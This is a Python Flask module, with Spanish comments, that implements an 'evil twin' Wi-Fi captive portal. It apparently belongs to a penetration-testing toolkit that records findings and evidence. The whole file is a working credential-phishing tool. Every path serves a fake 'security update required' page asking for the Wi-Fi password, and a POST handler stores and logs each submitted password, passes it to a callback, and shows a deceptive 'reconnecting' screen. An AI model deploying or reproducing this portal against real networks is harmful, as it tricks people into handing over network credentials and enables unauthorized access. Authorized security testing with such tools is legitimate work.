from __future__ import annotations

import logging
import sys
import threading
from typing import TYPE_CHECKING, Callable

from flask import Flask, render_template, request

if TYPE_CHECKING:
    from core.log_sistema import LogSistema
    from core.GestorProyectos import GestorProyectos

# Silenciar logs de Werkzeug — ruido innecesario en terminal táctica
logging.getLogger("werkzeug").setLevel(logging.ERROR)

# Suprimir el banner de Flask sin modificar el objeto app
_flask_cli = sys.modules.get("flask.cli")
if _flask_cli and hasattr(_flask_cli, "show_server_banner"):
    _flask_cli.show_server_banner = lambda *_: None


class EvilTwinServer:

    DEFAULT_HOST = "0.0.0.0"
    DEFAULT_PORT = 80

    def __init__(
        self,
        ssid: str = "Red_Publica",
        host: str = DEFAULT_HOST,
        port: int = DEFAULT_PORT,
        log: LogSistema | None = None,
        gp: GestorProyectos | None = None,
        on_captura: Callable[[str], None] | None = None,
    ) -> None:
        self.ssid       = ssid
        self.host       = host
        self.port       = port
        self._log       = log
        self._gp        = gp
        self._on_captura = on_captura
        self._capturas: list[str] = []
        self._app       = self._crear_app()
        self._hilo: threading.Thread | None = None

    # ── API pública ───────────────────────────────────────────────────

    def iniciar(self) -> threading.Thread:
        self._hilo = threading.Thread(
            target=self._app.run,
            kwargs={
                "host":        self.host,
                "port":        self.port,
                "use_reloader": False,
                "threaded":    True,
            },
            daemon=True,
            name="evil-twin-flask",
        )
        self._hilo.start()
        self._registrar("info", f"Portal cautivo activo en {self.host}:{self.port}")
        return self._hilo

    def esta_vivo(self) -> bool:
        return self._hilo is not None and self._hilo.is_alive()

    @property
    def capturas(self) -> list[str]:
        return list(self._capturas)

    # ── Construcción de la app Flask ──────────────────────────────────

    def _crear_app(self) -> Flask:
        app = Flask(__name__)

        @app.route("/", defaults={"path": ""})
        @app.route("/<path:path>")
        def portal_cautivo(path: str) -> str:
            try:
                return render_template("index.html", ssid=self.ssid)
            except Exception:
                return self._fallback_portal()

        @app.route("/capturar", methods=["POST"])
        def capturar() -> str:
            password = request.form.get("password", "").strip()
            if password:
                self._registrar_captura(password)
            return self._pantalla_cierre()

        return app

    # ── Manejo de capturas ────────────────────────────────────────────

    def _registrar_captura(self, password: str) -> None:
        self._capturas.append(password)
        self._registrar("audit", f"Credencial capturada — SSID: {self.ssid}")

        # Guardar en evidencias del proyecto activo
        if self._gp and self._gp.proyecto_activo:
            self._gp.registrar_hallazgo(
                "CRITICO",
                "Credencial WiFi capturada",
                f"SSID: {self.ssid}",
                "Cambiar la contraseña del access point objetivo.",
            )
            self._gp.registrar_evidencia(
                "evil_twin_captura",
                f"Credencial obtenida en portal cautivo SSID: {self.ssid}",
                {"ssid": self.ssid, "total_capturas": len(self._capturas)},
            )

        # Callback externo opcional (p.ej. para actualizar la UI en tiempo real)
        if self._on_captura:
            try:
                self._on_captura(password)
            except Exception:
                pass

    # ── Plantillas HTML de fallback ───────────────────────────────────

    @staticmethod
    def _fallback_portal() -> str:
        return (
            "<!DOCTYPE html><html><head><meta charset='utf-8'>"
            "<meta name='viewport' content='width=device-width,initial-scale=1'>"
            "<title>Actualización de red</title></head>"
            "<body style='font-family:sans-serif;text-align:center;padding:40px'>"
            "<h2>Actualización de seguridad requerida</h2>"
            "<form method='POST' action='/capturar'>"
            "<input type='password' name='password' placeholder='Contraseña WiFi' "
            "style='padding:8px;width:240px;margin:12px 0'><br>"
            "<button type='submit' style='padding:8px 24px'>Conectar</button>"
            "</form></body></html>"
        )

    @staticmethod
    def _pantalla_cierre() -> str:
        return (
            "<!DOCTYPE html><html><head><meta charset='utf-8'>"
            "<title>Conectando...</title></head>"
            "<body style='font-family:sans-serif;text-align:center;padding:50px'>"
            "<h2 style='color:#1a73e8'>Aplicando actualización...</h2>"
            "<p>Su conexión se restablecerá en breve.</p>"
            "</body></html>"
        )

    # ── Logging interno ───────────────────────────────────────────────

    def _registrar(self, nivel: str, mensaje: str) -> None:
        if self._log:
            getattr(self._log, nivel, self._log.info)(mensaje, "EvilTwin")


# ── Factory function — mantiene compatibilidad con ModuleRegistry ──────

def iniciar_servidor(
    ssid: str = "Red_Publica",
    log: LogSistema | None = None,
    gp: GestorProyectos | None = None,
) -> None:
    servidor = EvilTwinServer(ssid=ssid, log=log, gp=gp)
    servidor.iniciar()
